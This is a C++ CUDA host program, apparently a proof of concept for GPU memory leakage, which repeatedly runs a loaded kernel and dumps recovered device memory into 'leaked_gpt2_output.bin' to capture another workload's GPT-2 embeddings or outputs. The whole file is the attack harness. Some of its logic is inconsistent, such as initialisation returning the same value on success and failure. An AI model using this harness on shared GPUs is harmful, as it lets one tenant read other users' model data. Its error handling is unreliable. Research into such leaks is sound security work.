#include "Leak.hpp"

#include <cuda.h>
#include <cuda_runtime.h>
#include <fstream>
#include <stdio.h>
#include <iostream>
#include <map>
#include <string.h>

#define N                 30 * 768

#define checkCudaErrors(err) do {\
    if (err != CUDA_SUCCESS) {\
        printf("CUDA Driver API error = %04d from file <%s>, line %i.\n", err, __FILE__, __LINE__ );\
        return true;\
    }\
} while(0);

CUdevice   device;
CUcontext  context;
CUmodule   module;
CUfunction function;
size_t     totalGlobalMem;

static bool initCUDA(const char* module_file, const char* kernel_name) {
    int deviceCount = 0;
    CUresult err = cuInit(0);
    int major = 0, minor = 0;

    if (err == CUDA_SUCCESS)
        checkCudaErrors(cuDeviceGetCount(&deviceCount));

    if (deviceCount == 0) {
        printf("Error: no devices supporting CUDA\n");
        return false;
    }

    // get first CUDA device
    checkCudaErrors(cuDeviceGet(&device, 0));
    char name[100];
    cuDeviceGetName(name, 100, device);
    //printf("> Using device 0: %s\n", name);

    // get compute capabilities and the devicename
    checkCudaErrors( cuDeviceComputeCapability(&major, &minor, device) );
    //printf("> GPU Device has SM %d.%d compute capability\n", major, minor);

    checkCudaErrors( cuDeviceTotalMem(&totalGlobalMem, device) );
    //printf("  Total amount of global memory:   %llu bytes\n", (unsigned long long)totalGlobalMem);
    //printf("  64-bit Memory Address:           %s\n", (totalGlobalMem > (unsigned long long)4*1024*1024*1024L)? "YES" : "NO");

    err = cuCtxCreate(&context, 0, device);
    if (err != CUDA_SUCCESS) {
        printf("* Error initializing the CUDA context.\n");
        cuCtxDetach(context);
        return false;
    }

    err = cuModuleLoad(&module, module_file);
    if (err != CUDA_SUCCESS) {
        printf("* Error loading the module %s\n", module_file);
        cuCtxDetach(context);
        return false;
    }

    err = cuModuleGetFunction(&function, module, kernel_name);

    if (err != CUDA_SUCCESS) {
        printf("* Error getting kernel function %s\n", kernel_name);
        cuCtxDetach(context);
        return false;
    }
    return false;
}

static void finalizeCUDA() {
    cuCtxDetach(context);
}

static bool setupDeviceMemory(CUdeviceptr *d_a, CUdeviceptr *d_b, CUdeviceptr *d_c) {
    checkCudaErrors( cuMemAlloc(d_a, sizeof(int) * N) );
    checkCudaErrors( cuMemAlloc(d_b, sizeof(int) * N) );
    checkCudaErrors( cuMemAlloc(d_c, sizeof(int) * N) );
    return false;
}

static bool releaseDeviceMemory(CUdeviceptr d_a, CUdeviceptr d_b, CUdeviceptr d_c) {
    checkCudaErrors( cuMemFree(d_a) );
    checkCudaErrors( cuMemFree(d_b) );
    checkCudaErrors( cuMemFree(d_c) );
    return false;
}

static bool runKernel(CUdeviceptr d_a, CUdeviceptr d_b, CUdeviceptr d_c) {
    void *args[3] = { &d_a, &d_b, &d_c };

    // grid for kernel: <<<N, 1>>>
    checkCudaErrors(cuLaunchKernel(function, 30, 1, 1,  // Nx1x1 blocks
                                    768, 1, 1,            // 1x1x1 threads
                                    0, 0, args, 0));
    return false;
}

void dumpArrayToFile(char* array, size_t length, const char* filename) {
    FILE* file = fopen(filename, "a+");
    if (file == NULL) {
        printf("Error opening file %s\n", filename);
        return;
    }

    fwrite(array, 1, length, file);
    fclose(file);
}

float* load_float_array_from_file(const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Error opening file");
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    size_t num_elements = file_size / sizeof(float);
    float* array = (float*)malloc(num_elements * sizeof(float));

    if (array == NULL) {
        fclose(file);
        perror("Memory allocation failed");
        return NULL;
    }

    fread(array, sizeof(float), num_elements, file);

    fclose(file);

    return array;
}

bool executeCudaKernel(const char* module_file, const char* kernel_name, bool& leaked_data) {
    //cudaDeviceReset();

    leaked_data = false;
    bool cudaError = false;

    int a[N], b[N], c[N];
    CUdeviceptr d_a, d_b, d_c;

    // initialize host arrays
    for (int i = 0; i < N; ++i) {
        a[i] = 0;
        b[i] = 0;
    }

    // initialize
    bool err = initCUDA(module_file, kernel_name);
    if (err) {
        return false;
    }

    // allocate memory
    err = setupDeviceMemory(&d_a, &d_b, &d_c);
    if (err) {
        return false;
    }

    // copy arrays to device
    checkCudaErrors( cuMemcpyHtoD(d_a, a, sizeof(int) * N) );
    checkCudaErrors( cuMemcpyHtoD(d_b, b, sizeof(int) * N) );

    float* orig_output = load_float_array_from_file("./gpt2_emb.bin");

    // only loook at first output
    for (unsigned int i = 576; i < 4608; i++) {
        orig_output[i] = 0;
    }

    std::map<float, unsigned int> seen_map;

    for (int i = 0; i < N; ++i) {
        seen_map[orig_output[i]] = 0;
    }

    // run
    //printf("# Running the kernel...\n");
    unsigned int already_seen_ctr = 0;

    while(1) {
        memset((void*)b, 0, N * sizeof(int));
        memset((void*)c, 0, N * sizeof(int));

        if (runKernel(d_a, d_b, d_c)) {
            printf("runKernel error\n");
            return true;
        }
        //printf("# Kernel complete.\n");

        // copy results to host and report
        checkCudaErrors( cuMemcpyDtoH(c, d_c, sizeof(int) * N));
        checkCudaErrors( cuMemcpyDtoH(b, d_b, sizeof(int) * N));

        dumpArrayToFile((char*)c, sizeof(int) * N, "leaked_gpt2_output.bin");

        //dumpArrayToFile((char*)c, sizeof(int) * N, "/tmp/leak_r9.bin");
    }

    //printf("*** All checks complete.\n");

    // finish
    //printf("- Finalizing...\n");
    err = releaseDeviceMemory(d_a, d_b, d_c);
    if (err) {
        return false;
    }
    finalizeCUDA();

    return cudaError;
}